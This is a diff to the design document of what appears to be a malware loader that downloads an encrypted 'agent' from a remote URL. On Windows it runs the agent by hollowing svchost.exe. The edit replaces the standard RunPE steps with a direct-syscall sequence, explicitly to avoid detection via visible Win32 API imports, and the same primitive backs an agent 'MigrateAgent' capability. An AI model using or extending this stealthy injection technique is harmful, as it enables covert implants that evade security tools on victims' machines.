@@ -21,14 +21,20 @@ launcher --url https://updates.example.com/agent.enc --key <BASE64-32B> \
 ## Windows: process hollowing
 
 On Windows the launcher delegates to `hollowing::hollow_and_execute`,
-which performs the canonical RunPE sequence:
+which performs a direct-syscall RunPE sequence (avoiding the IAT-visible
+Win32 API surface):
 
-1. `CreateProcessW("C:\\Windows\\System32\\svchost.exe", CREATE_SUSPENDED | DETACHED_PROCESS)`
-2. `VirtualAllocEx(hProcess, …, RWX)` for the payload region
-3. `WriteProcessMemory` to copy the decrypted PE bytes
-4. Read DOS+NT headers from the payload to compute the entry point
-5. `GetThreadContext(hThread)` → set `Rcx` (x64) / `Eax` (x86) to the entry point → `SetThreadContext`
-6. `ResumeThread(hThread)`
+1. Resolve the target executable path via `NtOpenFile` → `NtCreateSection(SEC_IMAGE)` → `NtCreateProcessEx` to create a new process from the host binary (e.g. `svchost.exe`).
+2. `NtUnmapViewOfSection` to hollow the original image from the child process.
+3. `VirtualAllocEx` to allocate RWX memory in the child at the PE's preferred base address.
+4. Parse DOS + NT headers from the payload to locate sections and the entry point; `WriteProcessMemory` copies each PE section.
+5. Apply base relocations and resolve imports by walking the host process's PEB `Ldr` module list.
+6. `NtCreateThreadEx` (PE64) or `Wow64SetThreadContext` (PE32) to set the thread start address to the payload entry point.
+7. `NtResumeThread` starts execution.
+
+PE64 is the primary supported path. PE32/WOW64 support is present but should
+be treated as a compatibility work-in-progress — `Wow64GetThreadContext` /
+`Wow64SetThreadContext` may fail on certain Windows builds.
 
 The same primitive backs the agent's `MigrateAgent` capability, so the
 launcher and the agent share one tested code path.
